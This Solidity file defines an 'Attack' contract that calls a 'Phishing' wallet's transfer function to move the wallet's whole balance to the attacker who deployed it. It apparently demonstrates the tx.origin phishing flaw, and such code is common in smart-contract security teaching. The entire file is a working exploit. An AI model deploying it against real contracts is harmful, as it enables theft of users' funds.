// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Phishing {
    function transfer(address payable _to, uint amount) external;
}

contract Attack {
    Phishing phishing;
    address payable owner;

    constructor(address _phishing) {
        owner = payable(msg.sender);
        phishing = Phishing(_phishing);
    }

    function attack() public {
        phishing.transfer(owner, address(phishing).balance);
    }
}
